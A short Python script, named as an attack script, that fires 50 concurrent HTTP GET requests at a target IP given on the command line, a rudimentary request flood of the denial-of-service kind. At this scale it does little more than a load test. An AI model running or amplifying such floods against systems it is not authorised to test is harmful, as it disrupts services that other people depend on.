import sys
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

if len(sys.argv) != 2:
    print("Usage: python attack_script.py <target_ip>")
    sys.exit(1)

target_ip = sys.argv[1]
url = f"http://{target_ip}"

def make_request(url):
    try:
        response = requests.get(url)
        print(f"Requested {url} - Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error requesting {url}: {e}")

num_requests = 50

with ThreadPoolExecutor(max_workers=num_requests) as executor:
    futures = []
    for _ in range(num_requests):
        future = executor.submit(make_request, url)
        futures.append(future)

    
    for future in as_completed(futures):
        try:
            future.result()
        except Exception as e:
            print(f"Exception during request: {e}")


time.sleep(5) 

